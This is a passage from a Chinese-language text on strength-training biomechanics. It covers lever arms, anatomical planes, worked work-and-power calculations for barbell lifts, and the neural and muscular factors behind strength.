\uff1a\u5176\u8fd0\u52a8\u65b9\u5f0f\u9664\u4e86\u5c48\u66f2\u548c\u4f38\u5c55\u5916\uff0c\u8fd8\u5305\u62ec\u65cb\u8f6c\uff08\u524d\u81c2\u7684\u65cb\u524d\u548c\u65cb\u540e\uff09\uff0c\u8fd9\u79cd\u590d\u6742\u7684\u8fd0\u52a8\u65b9\u5f0f\u8981\u6c42\u5173\u8282\u5177\u6709\u8f83\u9ad8\u7684\u7075\u6d3b\u6027\uff0c\u800c\u4e0d\u662f\u589e\u52a0\u989d\u5916\u7684\u9aa8\u7ed3\u6784\u3002 \u7531\u4e8e\u8eab\u4f53\u4e2d\u6760\u6746\u7684\u5e03\u5c40\u7279\u70b9\uff0c\u5927\u90e8\u5206\u9aa8\u9abc\u808c\u90fd\u4ee5\u5f88\u5927\u7684\u8d1f\u673a\u68b0\u6548\u7387\u5de5\u4f5c\u3002\u5728\u8fdb\u884c\u4f53\u80b2\u8fd0\u52a8\u6216\u5176\u4ed6\u8eab\u4f53\u6d3b\u52a8\u65f6\uff0c\u808c\u8089\u548c\u808c\u8171\u6240\u627f\u53d7\u7684\u529b\u8fdc\u5927\u4e8e\u624b\u811a\u65bd\u52a0\u4e8e\u5916\u90b5\u7269\u4f53\u6216\u5730\u9762\u4e0a\u7684\u529b\u3002 \u808c\u8171\u4f4d\u7f6e\u5bfc\u81f4\u540c\u6837\u52a8\u4f5c\u7684\u6548\u7387\u4e0d\u540c \u4eba\u4e0e\u4eba\u4e4b\u95f4\u7684\u89e3\u5256\u5b66\u7ed3\u6784\u5b58\u5728\u76f8\u5f53\u5927\u7684\u5dee\u5f02\uff0c\u5305\u62ec\u808c\u8171\u9644\u7740\u4e8e\u9aa8\u7684\u6b62\u70b9\u4f4d\u7f6e\u3002 \u8fd9\u5f20\u56fe\u5c55\u793a\u4e86\u80b1\u4e8c\u5934\u808c\u5728\u8098\u5173\u8282\u5c48\u66f2\u8fc7\u7a0b\u4e2d\u7684\u529b\u81c2\u53d8\u5316\u3002 \u56fe\u89e3\u5185\u5bb9 \uff1a \u56fe\u4e2d\u7684\u7bad\u5934\u8868\u793a\u80b1\u4e8c\u5934\u808c\u6536\u7f29\u65f6\u7684\u529b\u91cf\u65b9\u5411\u3002 \u529b\u81c2\uff08M\uff09\u8868\u793a\u4ece\u5173\u8282\u65cb\u8f6c\u8f74\u5230\u808c\u8171\u4f5c\u7528\u7ebf\u7684\u5782\u76f4\u8ddd\u79bb\u3002 \u529b\u81c2\u53d8\u5316 \uff1a \u5f53\u8098\u5173\u8282\u4ece\u4f38\u76f4\u5230\u5b8c\u5168\u5c48\u66f2\u65f6\uff0c\u529b\u81c2\uff08M\uff09\u9010\u6e10\u53d8\u77ed\u3002 \u529b\u81c2\u8d8a\u77ed\uff0c\u673a\u68b0\u6548\u7387\u8d8a\u4f4e\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u808c\u8089\u9700\u8981\u7528\u66f4\u591a\u7684\u529b\u91cf\u6765\u4ea7\u751f\u76f8\u540c\u7684\u8fd0\u52a8\u3002 \u808c\u8171\u6b62\u70b9\u4f4d\u7f6e\u7684\u5f71\u54cd \uff1a \u5982\u679c\u808c\u8171\u6b62\u70b9\u4f4d\u7f6e\u9760\u8fd1\u5173\u8282\uff0c\u529b\u81c2\u4f1a\u53d8\u77ed\uff0c\u673a\u68b0\u6548\u7387\u4f4e\uff0c\u4f46\u52a8\u4f5c\u901f\u5ea6\u5feb\u3002 \u5982\u679c\u808c\u8171\u6b62\u70b9\u4f4d\u7f6e\u8fdc\u79bb\u5173\u8282\uff0c\u529b\u81c2\u4f1a\u53d8\u957f\uff0c\u673a\u68b0\u6548\u7387\u9ad8\uff0c\u4f46\u52a8\u4f5c\u901f\u5ea6\u6162\u3002 \u5b9e\u9645\u5e94\u7528 \uff1a \u4e3e\u91cd\u65f6\uff0c\u808c\u8171\u6b62\u70b9\u4f4d\u7f6e\u8fdc\u7684\u4eba\u53ef\u4ee5\u4e3e\u8d77\u66f4\u91cd\u7684\u91cd\u91cf\uff0c\u56e0\u4e3a\u4ed6\u4eec\u7684\u529b\u81c2\u66f4\u957f\uff0c\u80fd\u4ea7\u751f\u66f4\u5927\u7684\u529b\u77e9\u3002 \u4f46\u8fd9\u79cd\u7ed3\u6784\u4e5f\u4f1a\u5bfc\u81f4\u52a8\u4f5c\u901f\u5ea6\u53d8\u6162\uff0c\u56e0\u4e3a\u808c\u8089\u9700\u8981\u6536\u7f29\u66f4\u591a\u6765\u5b8c\u6210\u540c\u6837\u7684\u5173\u8282\u89d2\u5ea6\u53d8\u5316\u3002 \u89e3\u5228\u5e73\u9762\u548c\u4e3b\u8981\u8eab\u4f53\u8fd0\u52a8 \u56fe2.9\u5c55\u793a\u4e86\u4eba\u7ad9\u7acb\u65f6\u7684\u6807\u51c6\u89e3\u5256\u5b66\u7ecf\u52bf\u3002\u8eab\u4f53\u76f4\u7acb,\u53cc\u81c2\u81ea\u7136\u4e0b\u5782\u4e8e\u8eab\u4f53\u4e24\u4fa7,\u638c\u5fc3\u671d\u524d\u3002\u8eab\u4f53\u7684\u89e3\u5256\u89c6\u56fe,\u5982\u5728\u78c1\u5171\u632f\u6210\u50cf\u4e2d, \u901a\u5e38\u663e\u793a\u4e3a\u77e2\u72b6\u9762\u3001\u989d\u72b6\u9762\u548c\u6c34\u5e73\u9762\u3002\u4e09\u8005\u5206\u522b\u5c06\u8eab\u4f53\u5206\u6210\u5de6\u53f3\u3001\u524d\u540e\u548c\u4e0a\u4e0b\u90e8\u3001\u8fd9\u6837\u7684\u533a\u5206\u662f\u76f8\u5bf9\u6027\u7684,\u4e0d\u4e00\u5b9a\u5728\u6b63\u4e2d\u95f4\u3002 \u6b63\u529f\u4e0e\u529f\u7387 \u529b=\u8d28\u91cf\u00b7\u52a0\u901f\u5ea6 \u529f=\u529b\u00b7\u4f4d\u79fb \u529f\u7387=\u529f/\u65f6\u95f4 \u5728\u56fd\u9645\u5355\u4f4d\u5236(SI.\u7f29\u5199\u6765\u81ea\u6cd5\u8bed)\u4e2d * \u529b\u7684\u5355\u4f4d\u4e3a\u725b\u987f(N) * \u4f4d\u79fb\u7684\u5355\u4f4d\u662f\u7c73(m) * \u529f\u7684\u5355\u4f4d\u662f\u7126\u8033(J,\u5373N\u00b7m) * \u65f6\u95f4\u7684\u5355\u4f4d\u662f\u79d2(s) * \u529f\u7387\u7684\u5355\u4f4d\u662f\u74e6(W,\u5373J/s)\u3002 \u91cd\u590d10\u6b21\u5c06100kg\u7684\u6760\u94c3\u63d0\u8d772m\u7684\u505a\u529f\u8ba1\u7b97\u5982\u4e0b\u3002 \u6760\u94c3\u7684\u91cd\u529b\uff1a $$ F_1=9.8m\u00b2/s\\times 100kg\\times\\cos 0^\\circ =980N $$ \u7ed9\u54d1\u94c3\u79fb\u52a8\u7684\u529b\uff1a $$ F_2=2m\u00b2/s\\times100kg\\times\\cos 0^\\circ=200N $$ \u529f(\u6b63)= $$ (980N+200N)\\times2m\\times10=23600J $$ \u5047\u8bbe\u4e00\u7ec4\u52a8\u4f5c\u91cd\u590d10\u6b21\u9700\u898140s,\u8ba1\u7b97\u51fa\u8be5\u7ec4\u7684\u5e73\u5747\u8f93\u51fa\u529f\u7387(W): $$ \u529f\u7387(\u6b63)=\\frac {23600J}{40s}=590W $$ \u8d1f\u529f\u4e0e\u529f\u7387 \u5f53\u529b\u7684\u65b9\u5411\u4e0e\u91cd\u7269\u79fb\u52a8\u7684\u65b9\u5411\u76f8\u53cd\u65f6\uff08\u5982\u63a7\u5236\u91cd\u7269\u7f13\u6162\u4e0b\u653e\uff09\uff0c\u8ba1\u7b97\u51fa\u7684\u529f\u548c\u529f\u7387\u90fd\u6709\u8d1f\u53f7\u3002\u6240\u6709\u7684\u201c\u8d1f\u201d\u529f\u548c\u529f\u7387\u90fd\u5728\u808c\u8089\u79bb\u5fc3\u52a8\u4f5c\u65f6\u4ea7\u751f\uff0c\u4f8b\u5982\u653e\u4e0b\u91cd\u7269\u548c\u5feb\u901f\u52a8\u4f5c\u7684\u5236\u52a8\u9636\u6bb5\u3002\u4e25\u683c\u6765\u8bf4\uff0c\u4e0d\u5b58\u5728\u8d1f\u7684\u529f\u548c\u529f\u7387\u3002\u672f\u8bed\u8d1f\u529f\u5b9e\u9645\u4e0a\u662f\u65bd\u52a0\u4e8e\u808c\u8089\u4f46\u4e0d\u662f\u901a\u8fc7\u808c\u8089\u53d1\u6325\u4f5c\u7528\u7684\u529f\u3002\u5f53\u91cd\u91cf\u88ab\u63d0\u8d77\u65f6\uff0c\u808c\u8089\u5bf9\u7269\u4f53\u505a\u529f\uff0c\u589e\u52a0\u7269\u4f53\u7684\u52bf\u80fd\u3002\u5f53\u91cd\u7269\u88ab\u653e\u4e0b\u65f6\uff0c\u5176\u52bf\u80fd\u88ab\u7528\u4e8e\u5bf9\u8fd0\u52a8\u5458\u505a\u540c\u6837\u91cf\u7ea7\u7684\u529f\u3002\u56e0\u6b64\uff0c\u91cd\u590d\u4e3e\u8d77\u548c\u653e\u4e0b\u7269\u4f53\u65f6\uff0c\u662f\u8fd0\u52a8\u5458\u548c\u7269\u4f53\u76f8\u4e92\u5411\u5bf9\u65b9\u505a\u529f\uff0c\u800c\u4e0d\u662f\u8fd0\u52a8\u5458\u5728\u91cd\u590d\u5730\u505a\u6b63\u529f\u548c\u8d1f\u529f\u3002\u52a8\u4f5c\u91cd\u590d\u7684\u901f\u5ea6\u51b3\u5b9a\u4e86\u8f93\u51fa\u529f\u7387\u3002 \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u6760\u94c3\u81ea\u7531\u843d\u4f53\u7684\u52a0\u901f\u5ea6\u662f9.8 m/s\u00b2\uff0c\u5982\u679c\u5bf9\u5176\u65bd\u52a0\u7684\u51c0\u529b\u662f980N\uff08F\uff09\uff0c\u90a3\u4e48\u52a0\u901f\u5ea6\u662f0 m/s\u00b2\u3002\u5982\u679c\u6211\u4eec\u5c11\u7528200N\u7684\u529b\uff0c\u5219\u6760\u94c3\u7684\u52a0\u901f\u5ea6\u5c06\u4e3a2 m/s\u00b2\uff08200N\u9664\u4ee5100kg\u5f97\u51fa\u5176\u52a0\u901f\u5ea6a\uff0ca = F/m\uff09\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u5c31\u662f\u901a\u8fc7\u51cf\u5c0f\u65bd\u52a0\u7684\u529b\u6765\u63a7\u5236\u6760\u94c3\u4e0b\u843d\u7684\u52a0\u901f\u5ea6\u3002 $$ \u5047\u8bbe\u6760\u94c3\u91cd\u91cf\u4e3a100\u516c\u65a4\uff0c\u4e3a\u4f7f\u6760\u94c3\u4ee5\u52a0\u901f\u5ea62 m/s\u00b2\u4e0b\u843d\uff0c\u9700\u8981\u51cf\u5c11\u7684\u529bF_3\u8ba1\u7b97\u5982\u4e0b\uff1a $$ $$ F_3 = 2 \\, m/s \\times 100 \\, kg \\times \\cos 0^\\circ = 200 \\, N $$ $$ \u529f\uff08\u8d1f\uff09 = [ 980 \\, N + (-200 \\, N) ] \\times (-2 \\, m) \\times 10 = -15,600 \\, J $$ \u8fd9\u91cc980N\u662f\u91cd\u529b\u4f5c\u7528\u4e0b\u7684\u529b\uff0c200N\u662f\u51cf\u5c11\u7684\u529b\uff0c\u8d1f\u53f7\u8868\u793a\u65b9\u5411\u76f8\u53cd\u3002 \u8ba1\u7b97\u91cd\u590d10\u6b21\u4e0b\u653e\u52a8\u4f5c\u7684\u5e73\u5747\u8f93\u51fa\u529f\u7387\uff0c\u8fd9\u91cc\u603b\u65f6\u95f4\u4e3a40\u79d2\u3002 $$ \u529f\u7387\uff08\u8d1f\uff09 = \\frac{-15,600 \\, J}{40 \\, s} = -390 \\, W $$ \u529b\u91cf\u4e0e\u7206\u53d1\u529b \u4ece\u79d1\u5b66\u7684\u89d2\u5ea6\u6765\u770b\uff0c\u7206\u53d1\u529b\u548c\u529f\u7387\u662f\u540c\u4e00\u4e2a\u6982\u5ff5 \u529f\u7387 (Power) \uff1a\u5728\u7269\u7406\u5b66\u4e2d\uff0c\u529f\u7387\u662f\u6307\u5355\u4f4d\u65f6\u95f4\u5185\u505a\u7684\u529f\uff0c\u8ba1\u7b97\u516c\u5f0f\u662f\u529f\u7387=\u529b\u00d7\u901f\u5ea6\u3002 \u7206\u53d1\u529b \uff1a\u5728\u5065\u8eab\u548c\u8fd0\u52a8\u8bad\u7ec3\u4e2d\uff0c\u7206\u53d1\u529b\u901a\u5e38\u6307\u5728\u77ed\u65f6\u95f4\u5185\u5feb\u901f\u65bd\u52a0\u7684\u5927\u529b\u91cf\uff0c\u8fd9\u5b9e\u9645\u4e0a\u5c31\u662f\u9ad8\u529f\u7387\u3002 \u529b\u91cf\u548c\u7206\u53d1\u529b \uff1a \u529b\u91cf\u901a\u5e38\u4e0e\u4f4e\u901f\u8fd0\u52a8\u76f8\u5173\uff0c\u7206\u53d1\u529b\u4e0e\u5feb\u901f\u8fd0\u52a8\u76f8\u5173\u3002 \u4e8b\u5b9e\u4e0a\uff0c\u8fd9\u4e24\u4e2a\u6982\u5ff5\u90fd\u6d89\u53ca\u5728\u7279\u5b9a\u901f\u5ea6\u4e0b\u65bd\u52a0\u529b\u7684\u80fd\u529b\u3002 \u529f\u7387\u662f\u529b\u91cf\u548c\u901f\u5ea6\u7684\u51fd\u6570\uff0c\u901a\u8fc7\u5df2\u77e5\u5176\u4e2d\u4e24\u4e2a\u53d8\u91cf\u53ef\u4ee5\u8ba1\u7b97\u51fa\u7b2c\u4e09\u4e2a\u3002 \u8fd0\u52a8\u4e2d\u7684\u5e94\u7528 \uff1a \u529b\u91cf\u662f\u5728\u4efb\u4f55\u901f\u5ea6\u4e0b\u65bd\u52a0\u529b\u7684\u80fd\u529b\u3002 \u529f\u7387\u662f\u5728\u4efb\u4f55\u901f\u5ea6\u4e0b\u529b\u91cf\u548c\u901f\u5ea6\u7684\u4e58\u79ef\u3002 \u5728\u4e0d\u540c\u8fd0\u52a8\u4e2d\u65bd\u52a0\u529b\u7684\u901f\u5ea6\u548c\u963b\u529b\u4e0d\u540c\uff1a \u4f4e\u901f\u529b\u91cf\u5728\u9ad8\u963b\u529b\u3001\u4f4e\u901f\u5ea6\u8fd0\u52a8\u4e2d\u91cd\u8981\uff0c\u5982\u6a44\u6984\u7403\u4e2d\u7684\u5bf9\u6297\u3002 \u9ad8\u901f\u529b\u91cf\u5728\u4f4e\u963b\u529b\u3001\u9ad8\u901f\u5ea6\u8fd0\u52a8\u4e2d\u91cd\u8981\uff0c\u5982\u7fbd\u6bdb\u7403\u4e2d\u7684\u51fb\u7403\u3002 \u4eba\u4f53\u529b\u91cf\u7684\u751f\u7269\u529b\u5b66\u56e0\u7d20 \u795e\u7ecf\u63a7\u5236 \u795e\u7ecf\u7cfb\u7edf\u5bf9\u808c\u8089\u7684\u6fc0\u6d3b\u548c\u63a7\u5236\u662f\u5f71\u54cd\u529b\u91cf\u7684\u91cd\u8981\u56e0\u7d20\u3002\u901a\u8fc7\u795e\u7ecf\u5143\u7684\u534f\u8c03\u4f5c\u7528\uff0c\u80fd\u591f\u6709\u6548\u5730\u6fc0\u6d3b\u66f4\u591a\u7684\u808c\u7ea4\u7ef4\uff0c\u63d0\u5347\u529b\u91cf\u8f93\u51fa\u3002 \u808c\u8089\u6a2a\u622a\u9762\u79ef \u808c\u8089\u7684\u6a2a\u622a\u9762\u79ef\u8d8a\u5927\uff0c\u80fd\u4ea7\u751f\u7684\u529b\u91cf\u5c31\u8d8a\u5927\u3002\u8fd9\u662f\u56e0\u4e3a\u66f4\u591a\u7684\u808c\u7ea4\u7ef4\u80fd\u591f\u4ea7\u751f\u66f4\u5927\u7684\u603b\u6536\u7f29\u529b\u3002 \u808c\u7ea4\u7ef4\u6392\u5217 \u808c\u7ea4\u7ef4\u7684\u6392\u5217\u65b9\u5f0f\u5f71\u54cd\u529b\u91cf\u8f93\u51fa\u3002\u7fbd\u72b6\u808c\u7ea4\u7ef4\uff08\u5982\u80a1\u56db\u5934\u808c\uff09\u6392\u5217\u65b9\u5f0f\u80fd\u751f\u6210\u66f4\u5927\u7684\u529b\u91cf\uff0c\u800c\u5e73\u884c\u808c\u7ea4\u7ef4\uff08\u5982\u8153\u80a0\u808c\uff09\u66f4\u9002\u5408\u9ad8\u901f\u8fd0\u52a8\u3002 \u808c\u8089\u957f\u5ea6 \u808c\u8089\u5728\u6700\u4f73\u957f\u5ea6\uff08\u901a\u5e38\u662f\u4e2d\u95f4\u957f\u5ea6\uff09\u65f6\u80fd\u4ea7\u751f\u6700\u5927\u529b\u91cf\u3002\u8fc7\u957f\u6216\u8fc7\u77ed\u90fd\u4f1a\u5f71\u54cd\u529b\u91cf\u8f93\u51fa\u3002 \u5173\u8282\u89d2\u5ea6 \u5173\u8282\u7684\u89d2\u5ea6\u4f1a\u5f71\u54cd\u808c\u8089\u65bd\u529b\u7684\u6548\u679c\u3002\u5728\u67d0\u4e9b\u89d2\u5ea6\u4e0b\uff0c\u808c\u8089\u80fd\u591f\u66f4\u6709\u6548\u5730\u53d1\u529b\uff0c\u8fd9\u5c31\u662f\u6240\u8c13\u7684\u201c\u529b\u91cf\u66f2\u7ebf\u201d\u3002 \u808c\u8089\u6536\u7f29\u901f\u5ea6 \u529b\u91cf\u4e0e\u808c\u8089\u6536\u7f29\u901f\u5ea6\u5448\u53cd\u6bd4\u5173\u7cfb\u3002\u9ad8\u901f\u6536\u7f29\u65f6\u529b\u91cf\u8f93\u51fa\u8f83\u4f4e\uff0c\u4f4e\u901f\u6536\u7f29\u65f6\u529b\u91cf\u8f93\u51fa\u8f83\u9ad8\u3002\u8fd9\u662f\u56e0\u4e3a\u9ad8\u901f\u6536\u7f29\u65f6\uff0c\u808c\u7ea4\u7ef4\u65e0\u6cd5\u5b8c\u5168\u53c2\u4e0e\u53d1\u529b\u3002 \u5173\u8282\u89d2\u901f\u5ea6 \u5173\u8282\u7684\u65cb\u8f6c\u901f\u5ea6\u4e5f\u5f71\u54cd\u529b\u91cf\u8868\u73b0\u3002\u5728\u9ad8\u901f\u8fd0\u52a8\u4e2d\uff0c\u5173\u8282\u89d2\u901f\u5ea6\u8f83\u5927\uff0c\u800c\u529b\u91cf\u8f93\u51fa\u53ef\u80fd\u53d7\u9650\u3002 \u4f53\u578b \u4e2a\u4f53\u7684\u4f53\u578b\uff08\u5982\u8eab\u9ad8\u3001\u4f53\u91cd\u548c\u4f53\u8102\u6bd4\u4f8b\uff09\u4f1a\u5f71\u54cd\u529b\u91cf\u8868\u73b0\u3002\u8f83\u5927\u7684\u4f53\u578b\u901a\u5e38\u5177\u6709\u8f83\u5927\u7684\u808c\u8089\u8d28\u91cf\uff0c\u4f46\u8fc7\u9ad8\u7684\u4f53\u8102\u53ef\u80fd\u4e0d\u5229\u4e8e\u529b\u91cf\u6548\u7387\u3002 \u795e\u7ecf\u63a7\u5236 \u795e\u7ecf\u7cfb\u7edf\u5bf9\u808c\u8089\u6700\u5927\u8f93\u51fa\u529b\u91cf\u7684\u63a7\u5236\u673a\u5236\u6d89\u53ca\u591a\u4e2a\u65b9\u9762\uff0c\u4ee5\u4e0b\u662f\u8be6\u7ec6\u89e3\u91ca\uff1a \u8fd0\u52a8\u5355\u4f4d\u6570\u91cf\u7684\u52df\u96c6 \u8fd0\u52a8\u5355\u4f4d \uff1a\u6307\u7684\u662f\u7531\u4e00\u4e2a\u8fd0\u52a8\u795e\u7ecf\u5143\u53ca\u5176\u6240\u652f\u914d\u7684\u6240\u6709\u808c\u7ea4\u7ef4\u7ec4\u6210\u7684\u529f\u80fd\u5355\u4f4d\u3002 \u52df\u96c6 \uff1a\u66f4\u591a\u7684\u8fd0\u52a8\u5355\u4f4d\u53c2\u4e0e\u808c\u8089\u6536\u7f29\uff0c\u610f\u5473\u7740\u53ef\u4ee5\u4ea7\u751f\u66f4\u5927\u7684\u529b\u91cf\u3002\u521d\u59cb\u8bad\u7ec3\u65f6\uff0c\u795e\u7ecf\u7cfb\u7edf\u4f1a\u5b66\u4e60\u5982\u4f55\u6fc0\u6d3b\u66f4\u591a\u7684\u8fd0\u52a8\u5355\u4f4d\u4ee5\u63d0\u5347\u529b\u91cf\u3002 \u8fd0\u52a8\u5355\u4f4d\u4f53\u79ef \u8fd0\u52a8\u5355\u4f4d\u4f53\u79ef \uff1a\u6307\u7684\u662f\u4e00\u4e2a\u8fd0\u52a8\u5355\u4f4d\u6240\u5305\u542b\u7684\u808c\u7ea4\u7ef4\u6570\u91cf\u3002 \u4f53\u79ef\u8d8a\u5927\uff0c\u529b\u91cf\u8d8a\u5927 \uff1a\u5927\u4f53\u79ef\u7684\u8fd0\u52a8\u5355\u4f4d\u80fd\u4ea7\u751f\u66f4\u5927\u7684\u529b\u91cf\uff0c\u56e0\u4e3a\u5b83\u4eec\u5305\u542b\u66f4\u591a\u7684\u808c\u7ea4\u7ef4\uff0c\u80fd\u591f\u4ea7\u751f\u66f4\u5927\u7684\u603b\u6536\u7f29\u529b\u3002 \u6fc0\u6d3b\u9891\u7387 \u6fc0\u53d1\u9891\u7387 \uff1a\u662f\u6307\u8fd0\u52a8\u795e\u7ecf\u5143\u53d1\u51fa\u795e\u7ecf\u51b2\u52a8\u7684\u9891\u7387\u3002 \u9891\u7387\u8d8a\u9ad8\uff0c\u529b\u91cf\u8d8a\u5927 \uff1a\u9ad8\u9891\u7387\u7684\u795e\u7ecf\u51b2\u52a8\u4f1a\u5bfc\u81f4\u808c\u7ea4\u7ef4\u66f4\u9891\u7e41\u5730\u6536\u7f29\uff0c\u589e\u52a0\u6574\u4f53\u529b\u91cf\u8f93\u51fa\u3002 \u6297\u963b\u8bad\u7ec3\u4e2d\u7684\u795e\u7ecf\u9002\u5e94 \u521d\u671f\u8fdb\u6b65 \uff1a\u529b\u91cf\u8bad\u7ec3\u521d\u671f\u7684\u8fdb\u6b65\u4e3b\u8981\u5f52\u56e0\u4e8e\u795e\u7ecf\u9002\u5e94\u3002\u5927\u8111\u548c\u795e\u7ecf\u7cfb\u7edf\u5b66\u4f1a\u4e86\u66f4\u6709\u6548\u5730\u6fc0\u6d3b\u808c\u7ea4\u7ef4\uff0c\u751a\u81f3\u5728\u808c\u8089\u672c\u8eab\u6ca1\u6709\u663e\u8457\u53d8\u5316\u7684\u60c5\u51b5\u4e0b\u4e5f\u80fd\u63d0\u5347\u529b\u91cf\u3002 \u65b0\u624b\u8bad\u7ec3\u53cd\u5e94 \uff1a\u521a\u5f00\u59cb\u529b\u91cf\u8bad\u7ec3\u7684\u65b0\u624b\u901a\u5e38\u4f1a\u5728\u6700\u521d\u51e0\u5468\u5185\u770b\u5230\u663e\u8457\u7684\u529b\u91cf\u63d0\u5347\uff0c\u8fd9\u4e3b\u8981\u662f\u56e0\u4e3a\u795e\u7ecf\u9002\u5e94\uff0c\u800c\u4e0d\u662f\u808c\u8089\u7684\u7269\u7406\u53d8\u5316\u3002 \u957f\u671f\u8bad\u7ec3\u6548\u679c \u6e10\u8fdb\u6027 \uff1a\u968f\u7740\u8bad\u7ec3\u7684\u7ee7\u7eed\uff0c\u529b\u91cf\u63d0\u5347\u7684\u901f\u5ea6\u4f1a\u51cf\u6162\u3002\u8fd9\u662f\u56e0\u4e3a\u521d\u671f\u7684\u795e\u7ecf\u9002\u5e94\u5df2\u8fbe\u5230\u4e00\u5b9a\u7a0b\u5ea6\uff0c\u8fdb\u4e00\u6b65\u7684\u8fdb\u6b65\u9700\u8981\u4f9d\u8d56\u4e8e\u808c\u8089\u7684\u7269\u7406\u53d8\u5316\uff0c\u5982\u808c\u8089\u80a5\u5927\uff08\u808c\u8089\u6a2a\u622a\u9762\u79ef\u589e\u52a0\uff09\u3002 \u808c\u8089\u80a5\u5927 \uff1a\u6301\u7eed\u8bad\u7ec3\u5c06\u5bfc\u81f4\u808c\u8089\u7ea4\u7ef4\u589e\u7c97\uff08\u80a5\u5927\uff09\uff0c\u8fd9\u4f1a\u5e26\u6765\u66f4\u5927\u7684\u529b\u91cf\u3002 \u65b0\u624b\u8bad\u7ec3\u7684\u5fc3\u6001\u7ba1\u7406 \u8010\u5fc3\u548c\u575a\u6301 \uff1a\u65b0\u624b\u5728\u8bad\u7ec3\u521d\u671f\u770b\u5230\u8fdb\u6b65\u51cf\u7f13\u540e\uff0c\u53ef\u80fd\u4f1a\u611f\u5230\u6cae\u4e27\u3002\u4f46\u91cd\u8981\u7684\u662f\u8981\u8ba4\u8bc6\u5230\uff0c\u529b\u91cf\u7684\u8fdb\u4e00\u6b65\u63d0\u9ad8\u5c06\u901a\u8fc7\u66f4\u6162\u4f46\u7a33\u5b9a\u7684\u8fc7\u7a0b\u5b9e\u73b0\uff0c\u5982\u808c\u8089\u80a5\u5927\u3002 \u957f\u671f\u76ee\u6807 \uff1a\u4fdd\u6301\u957f\u671f\u8bad\u7ec3\u8ba1\u5212\u7684\u575a\u6301\uff0c\u6700\u7ec8\u4f1a\u770b\u5230\u663e\u8457\u7684\u529b\u91cf\u548c\u808c\u8089\u4f53\u79ef\u7684\u589e\u52a0\u3002 \u808c\u8089\u6a2a\u622a\u9762\u79ef \u6a2a\u622a\u9762\u79ef \uff1a\u808c\u8089\u80fd\u65bd\u52a0\u7684\u529b\u91cf\u4e3b\u8981\u4e0e\u5176\u6a2a\u622a\u9762\u79ef\u6709\u5173\uff0c\u800c\u4e0d\u662f\u808c\u8089\u7684\u603b\u4f53\u79ef\u3002 \u76f8\u540c\u6a2a\u622a\u9762\u79ef \uff1a\u5982\u679c\u4e24\u540d\u8fd0\u52a8\u5458\u80b1\u4e8c\u5934\u808c\u7684\u5468\u957f\u76f8\u540c\uff0c\u90a3\u4e48\u4ed6\u4eec\u7684\u808c\u8089\u6a2a\u622a\u9762\u79ef\u4e5f\u5927\u81f4\u76f8\u540c\uff0c\u5c3d\u7ba1\u4ed6\u4eec\u7684\u8eab\u9ad8\u548c\u4f53\u91cd\u4e0d\u540c\u3002 \u76f8\u540c\u529b\u91cf \uff1a\u5728\u5176\u4ed6\u6761\u4ef6\u76f8\u540c\u7684\u60c5\u51b5\u4e0b\uff0c\u6a2a\u622a\u9762\u79ef\u76f8\u540c\u7684\u808c\u8089\u4f1a\u4ea7\u751f\u76f8\u540c\u7684\u529b\u91cf\u3002 \u8eab\u9ad8\u548c\u4f53\u91cd\u5bf9\u8fd0\u52a8\u8868\u73b0\u7684\u5f71\u54cd \u8f83\u9ad8\u7684\u8fd0\u52a8\u5458 \uff1a\u867d\u7136\u8f83\u9ad8\u7684\u8fd0\u52a8\u5458\u808c\u8089\u4f53\u79ef\u66f4\u5927\uff08\u56e0\u4e3a\u808c\u8089\u8f83\u957f\uff09\uff0c\u4f46\u7531\u4e8e\u4f53\u91cd\u5927\uff0c\u5728\u9700\u8981\u514b\u670d\u81ea\u8eab\u91cd\u529b\u6216\u52a0\u901f\u8eab\u4f53\u65f6\u4f1a\u5904\u4e8e\u52a3\u52bf\u3002 \u76f8\u5bf9\u52a3\u52bf \uff1a\u8f83\u9ad8\u3001\u8f83\u91cd\u7684\u8fd0\u52a8\u5458\u5728\u8857\u5934\u5065\u8eab\u548c\u4f53\u64cd\u7b49\u9700\u8981\u8f83\u9ad8\u76f8\u5bf9\u529b\u91cf\u7684\u8fd0\u52a8\u4e2d\uff0c\u8868\u73b0\u53ef\u80fd\u4e0d\u5982\u8f83\u77ee\u3001\u8f83\u8f7b\u7684\u8fd0\u52a8\u5458\u3002 \u4f53\u64cd\u8fd0\u52a8\u5458 \uff1a\u8fd9\u89e3\u91ca\u4e86\u4e3a\u4ec0\u4e48\u5927\u591a\u6570\u4f18\u79c0\u4f53\u64cd\u8fd0\u52a8\u5458\u7684\u8eab\u9ad8\u901a\u5e38\u8f83\u77ee\uff0c\u4ed6\u4eec\u80fd\u591f\u66f4\u6709\u6548\u5730\u5229\u7528\u76f8\u5bf9\u529b\u91cf\u8fdb\u884c\u9ad8\u96be\u5ea6\u52a8\u4f5c\u3002 \u6297\u963b\u8bad\u7ec3\u7684\u6548\u679c \u589e\u52a0\u529b\u91cf\u548c\u6a2a\u622a\u9762\u79ef \uff1a\u6297\u963b\u8bad\u7ec3\u4e0d\u4ec5\u80fd\u589e\u52a0\u808c\u8089\u7684\u529b\u91cf\uff0c\u8fd8\u80fd\u589e\u52a0\u808c\u8089\u7684\u6a2a\u622a\u9762\u79ef\uff0c\u4ece\u800c\u63d0\u9ad8\u6574\u4f53\u8fd0\u52a8\u8868\u73b0\u3002 \u603b\u7ed3\u6765\u8bf4\uff0c\u808c\u8089\u529b\u91cf\u4e3b\u8981\u53d6\u51b3\u4e8e\u5176\u6a2a\u622a\u9762\u79ef\uff0c\u800c\u8eab\u9ad8\u548c\u4f53\u91cd\u5219\u5f71\u54cd\u8fd0\u52a8\u5458\u5728\u7279\u5b9a\u8fd0\u52a8\u4e2d\u7684\u8868\u73b0\u3002\u6297\u963b\u8bad\u7ec3\u662f\u63d0\u9ad8\u808c\u8089\u529b\u91cf\u548c\u6a2a\u622a\u9762\u79ef\u7684\u6709\u6548\u65b9\u6cd5\uff0c\u6709\u52a9\u4e8e\u63d0\u5347\u6574\u4f53\u8fd0\u52a8\u80fd\u529b\u3002 \u808c\u7ea4\u7ef4\u6392\u5217 \u808c\u8089\u7684\u6700\u5927\u6536\u7f29\u529b \u529b\u7684\u8303\u56f4 \uff1a\u7814\u7a76\u8868\u660e\uff0c\u808c\u8089\u5728\u6700\u5927\u6536\u7f29\u65f6\u80fd\u591f\u5728\u6a2a\u622a\u9762\u4e0a\u4ea7\u751f23~145psi\uff0816~100N/cm\u00b2\uff09\u7684\u529b\u3002 \u5f71\u54cd\u56e0\u7d20 